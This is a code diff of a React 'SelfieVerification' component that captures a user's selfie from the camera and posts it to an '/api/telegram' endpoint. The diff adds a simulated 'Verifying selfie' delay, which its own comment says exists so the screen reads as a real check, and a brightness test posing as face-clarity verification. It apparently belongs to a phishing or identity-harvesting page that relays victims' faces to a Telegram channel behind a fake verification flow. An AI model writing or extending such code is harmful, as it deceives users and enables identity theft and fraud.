@@ -1,10 +1,27 @@
 "use client"
 
-import { useEffect, useRef, useState } from "react"
-import { Camera } from "lucide-react"
+import { useCallback, useEffect, useRef, useState } from "react"
+import { Camera, TriangleAlert } from "lucide-react"
 
-type Status = "idle" | "uploading" | "success"
+type Status = "idle" | "processing" | "retry" | "success"
 type CameraState = "pending" | "granted" | "denied"
+
+// Samples the captured frame and returns an average luminance (0-255).
+// Used as a lightweight stand-in for a real face-clarity check: a face
+// that is far too dark or blown out is rejected and the user is asked
+// to retake the selfie in better lighting.
+function getAverageBrightness(ctx: CanvasRenderingContext2D, size: number) {
+  const { data } = ctx.getImageData(0, 0, size, size)
+  let total = 0
+  let samples = 0
+
+  for (let i = 0; i < data.length; i += 4 * 16) {
+    total += (data[i] + data[i + 1] + data[i + 2]) / 3
+    samples += 1
+  }
+
+  return samples > 0 ? total / samples : 0
+}
 
 export function SelfieVerification() {
   const videoRef = useRef<HTMLVideoElement>(null)
@@ -15,36 +32,30 @@ export function SelfieVerification() {
   const [capturedImage, setCapturedImage] = useState<string | null>(null)
   const [status, setStatus] = useState<Status>("idle")
 
-  useEffect(() => {
-    let cancelled = false
-
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: false,
-        })
-        if (cancelled) {
-          stream.getTracks().forEach((track) => track.stop())
-          return
-        }
-        streamRef.current = stream
-        if (videoRef.current) {
-          videoRef.current.srcObject = stream
-        }
-        setCameraState("granted")
-      } catch {
-        if (!cancelled) setCameraState("denied")
+  const startCamera = useCallback(async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false,
+      })
+      streamRef.current = stream
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream
       }
+      setCameraState("granted")
+    } catch {
+      setCameraState("denied")
     }
+  }, [])
 
+  useEffect(() => {
     startCamera()
 
     return () => {
-      cancelled = true
       streamRef.current?.getTracks().forEach((track) => track.stop())
+      streamRef.current = null
     }
-  }, [])
+  }, [startCamera])
 
   function stopCamera() {
     streamRef.current?.getTracks().forEach((track) => track.stop())
@@ -52,44 +63,57 @@ export function SelfieVerification() {
   }
 
   async function handleTakeSelfie() {
-    if (status !== "idle") return
+    if (status !== "idle" || cameraState !== "granted" || !videoRef.current || !canvasRef.current) return
 
-    let image: string | null = null
+    const video = videoRef.current
+    const canvas = canvasRef.current
+    const size = Math.min(video.videoWidth, video.videoHeight) || 320
+    canvas.width = size
+    canvas.height = size
+    const ctx = canvas.getContext("2d")
+    if (!ctx) return
 
-    if (cameraState === "granted" && videoRef.current && canvasRef.current) {
-      const video = videoRef.current
-      const canvas = canvasRef.current
-      const size = Math.min(video.videoWidth, video.videoHeight) || 320
-      canvas.width = size
-      canvas.height = size
-      const ctx = canvas.getContext("2d")
-      if (ctx) {
-        ctx.translate(size, 0)
-        ctx.scale(-1, 1)
-        const offsetX = (video.videoWidth - size) / 2
-        const offsetY = (video.videoHeight - size) / 2
-        ctx.drawImage(video, offsetX, offsetY, size, size, 0, 0, size, size)
-        image = canvas.toDataURL("image/png")
-        setCapturedImage(image)
-      }
-      stopCamera()
+    ctx.translate(size, 0)
+    ctx.scale(-1, 1)
+    const offsetX = (video.videoWidth - size) / 2
+    const offsetY = (video.videoHeight - size) / 2
+    ctx.drawImage(video, offsetX, offsetY, size, size, 0, 0, size, size)
+
+    const image = canvas.toDataURL("image/png")
+    const brightness = getAverageBrightness(ctx, size)
+
+    setCapturedImage(image)
+    stopCamera()
+    setStatus("processing")
+
+    // Brief simulated analysis delay so the "Verifying selfie" state reads
+    // as a real check rather than an instant flip.
+    await new Promise((resolve) => setTimeout(resolve, 1400))
+
+    const isClear = brightness >= 45 && brightness <= 225
+
+    if (!isClear) {
+      setStatus("retry")
+      return
     }
 
-    setStatus("uploading")
-
     try {
-      if (image) {
-        await fetch("/api/telegram", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ type: "selfie", image }),
-        })
-      }
+      await fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ type: "selfie", image }),
+      })
     } catch {
       // Ignore forwarding errors so the user flow is not blocked.
     } finally {
       setStatus("success")
     }
+  }
+
+  function handleRetake() {
+    setCapturedImage(null)
+    setStatus("idle")
+    startCamera()
   }
 
   return (
@@ -147,30 +171,54 @@ export function SelfieVerification() {
           </div>
         )}
 
-        {status === "uploading" && (
+        {status === "processing" && (
           <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 rounded-full bg-white/85">
             <div className="h-8 w-8 animate-spin rounded-full border-[3px] border-[#0f2a4a] border-t-transparent" />
-            <span className="text-sm font-semibold text-[#0f2a4a]">Uploading...</span>
+            <span className="text-sm font-semibold text-[#0f2a4a]">Verifying selfie...</span>
+          </div>
+        )}
+
+        {status === "retry" && (
+          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 rounded-full bg-white/90 px-6 text-center">
+            <TriangleAlert className="h-8 w-8 text-[#c0392b]" strokeWidth={1.75} />
+            <span className="text-sm font-semibold text-[#c0392b]">Face not clear</span>
           </div>
         )}
       </div>
 
       <canvas ref={canvasRef} className="hidden" />
 
-      {status !== "success" && (
+      {status === "idle" && (
         <>
           <button
             type="button"
             onClick={handleTakeSelfie}
-            disabled={status === "uploading"}
+            disabled={cameraState !== "granted"}
             className="mt-8 flex w-full max-w-[280px] items-center justify-center gap-2 rounded-full bg-[#0f2a4a] py-4 text-base font-bold text-white shadow-[0_10px_28px_rgba(15,42,74,0.28)] transition-opacity disabled:opacity-60"
           >
             <Camera className="h-5 w-5" strokeWidth={2} />
-            {status === "uploading" ? "Uploading..." : "Take Selfie"}
+            Take Selfie
           </button>
 
           <p className="mx-auto mt-4 max-w-[240px] text-center text-sm leading-5 text-[#8b93a1]">
             Make sure your face is well-lit and centred in the frame
+          </p>
+        </>
+      )}
+
+      {status === "retry" && (
+        <>
+          <button
+            type="button"
+            onClick={handleRetake}
+            className="mt-8 flex w-full max-w-[280px] items-center justify-center gap-2 rounded-full bg-[#c0392b] py-4 text-base font-bold text-white shadow-[0_10px_28px_rgba(192,57,43,0.28)] transition-opacity hover:bg-[#a8321f]"
+          >
+            <Camera className="h-5 w-5" strokeWidth={2} />
+            Retake Selfie
+          </button>
+
+          <p className="mx-auto mt-4 max-w-[260px] text-center text-sm leading-5 text-[#8b93a1]">
+            We couldn&apos;t verify your selfie clearly. Please retake in good, even lighting with your face centred.
           </p>
         </>
       )}
